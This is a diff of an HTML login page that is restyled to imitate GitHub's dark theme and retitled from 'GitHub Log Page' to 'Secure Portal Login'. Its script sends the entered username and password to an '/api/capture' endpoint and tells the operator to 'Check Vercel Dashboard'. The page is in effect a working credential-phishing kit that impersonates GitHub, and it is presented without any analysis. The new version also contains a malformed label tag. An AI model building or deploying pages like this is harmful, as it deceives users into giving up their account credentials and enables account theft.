@@ -1,151 +1,148 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>GitHub Log Page</title>
-<style>
-  /* Reset and base styles */
-  * {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-  }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal Login</title>
+    <style>
+        /* Reset & Base */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    /* Professional, neutral background with subtle gradient for elegance */
-    background: linear-gradient(135deg, #f0f2f5, #dfe3e8);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-  }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            /* Professional Dark Abstract Background */
+            background: radial-gradient(circle at top left, #1a202c, #0d1117 60%, #000000);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #c9d1d9; /* GitHub text color */
+        }
 
-  /* Card container with glassmorphism effect */
-  .login-card {
-    background: rgba(255, 255, 255, 0.2);
-    backdrop-filter: blur(10px);
-    -webkit-backdrop-filter: blur(10px);
-    border-radius: 12px;
-    padding: 40px;
-    max-width: 400px;
-    width: 100%;
-    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-    border: 1px solid rgba(255, 255, 255, 0.3);
-  }
+        /* Glassmorphism Card */
+        .login-card {
+            background: rgba(22, 27, 34, 0.65); /* Semi-transparent dark bg */
+            backdrop-filter: blur(12px); /* The frosted glass effect */
+            -webkit-backdrop-filter: blur(12px);
+            padding: 40px;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 380px;
+            
+            /* Subtle border for glass edge definition */
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
 
-  /* Heading styled similar to GitHub */
-  h2 {
-    text-align: center;
-    margin-bottom: 30px;
-    font-size: 24px;
-    font-weight: 600;
-    color: #24292f; /* GitHub dark gray */
-  }
+        h2 {
+            text-align: center;
+            margin-bottom: 24px;
+            color: #ffffff; /* White text for contrast */
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
 
-  /* Input group styles */
-  .input-group {
-    margin-bottom: 20px;
-  }
+        .input-group {
+            margin-bottom: 18px;
+        }
 
-  /* Labels styling */
-  .input-group label {
-    display: block;
-    margin-bottom: 8px;
-    font-size: 14px;
-    color: #4b5563; /* Gray color similar to GitHub labels */
-  }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8b949e; /* GitHub muted text */
+            font-size: 14px;
+            font-weight: 500;
+        }
 
-  /* Input fields with glassmorphism */
-  .input-group input {
-    width: 100%;
-    padding: 12px 14px;
-    border: 1px solid rgba(209, 213, 219, 0.5);
-    border-radius: 8px;
-    font-size: 14px;
-    background: rgba(255, 255, 255, 0.2);
-    color: #111827; /* Dark text for readability */
-    transition: border-color 0.3s, box-shadow 0.3s;
-  }
+        .input-group input {
+            width: 100%;
+            padding: 10px 12px;
+            background-color: #0d1117; /* Dark input bg */
+            border: 1px solid #30363d; /* GitHub border color */
+            border-radius: 6px;
+            color: #c9d1d9;
+            font-size: 14px;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
 
-  /* Focus state for inputs */
-  .input-group input:focus {
-    outline: none;
-    border-color: #0366d6;
-    box-shadow: 0 0 0 3px rgba(3, 102, 214, 0.2);
-  }
+        .input-group input:focus {
+            outline: none;
+            border-color: #58a6ff; /* GitHub blue focus */
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15); /* Subtle glow */
+        }
 
-  /* Submit button style */
-  .btn {
-    width: 100%;
-    padding: 14px;
-    background-color: #0366d6;
-    color: #ffffff;
-    border: none;
-    border-radius: 8px;
-    font-size: 15px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: background-color 0.3s, box-shadow 0.2s;
-  }
+        .btn {
+            width: 100%;
+            padding: 10px 16px;
+            background-color: #238636; /* GitHub Green Button */
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-top: 10px;
+        }
 
-  /* Hover effect for button */
-  .btn:hover {
-    background-color: #055ecf;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-  }
-
-  /* Optional: add focus style for accessibility */
-  .btn:focus {
-    outline: none;
-    box-shadow: 0 0 0 3px rgba(3, 102, 214, 0.4);
-  }
-</style>
+        .btn:hover {
+            background-color: #2ea043; /* Lighter green on hover */
+        }
+    </style>
 </head>
+
 <body>
-<div class="login-card">
-  <h2>Account Login</h2>
-  <form id="loginForm">
-    <div class="input-group">
-      <label for="username">Username</label>
-      <input type="text" id="username" required autocomplete="off" placeholder="Enter your username" />
+    <div class="login-card">
+        <h2>Account Login</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                < label for="password">Password</label>
+                <input type="password" id="password" required autocomplete="off">
+            </div>
+            <button type="submit" class="btn">Log In</button>
+        </form>
     </div>
-    <div class="input-group">
-      <label for="password">Password</label>
-      <input type="password" id="password" required autocomplete="off" placeholder="Enter your password" />
-    </div>
-    <button type="submit" class="btn">Log In</button>
-  </form>
-</div>
-<script>
-  document.getElementById('loginForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
 
-    const usernameVal = document.getElementById('username').value;
-    const passwordVal = document.getElementById('password').value;
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
 
-    try {
-      const response = await fetch('/api/capture', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          user: usernameVal,
-          pass: passwordVal
-        })
-      });
-      if (response.ok) {
-        alert('Request logged. Check Vercel Dashboard!');
-        document.getElementById('loginForm').reset();
-      } else {
-        alert('Error payload status: ' + response.status);
-      }
-    } catch (err) {
-      console.error('Network execution failure:', err);
-    }
-  });
-</script>
+            const usernameVal = document.getElementById('username').value;
+            const passwordVal = document.getElementById('password').value;
+
+            try {
+                const response = await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        user: usernameVal,
+                        pass: passwordVal
+                    })
+                });
+
+                if (response.ok) {
+                    alert('Request logged. Check Vercel Dashboard!');
+                    document.getElementById('loginForm').reset();
+                } else {
+                    alert('Error payload status: ' + response.status);
+                }
+            } catch (err) {
+                console.error('Network execution failure:', err);
+            }
+        });
+    </script>
 </body>
+
 </html>
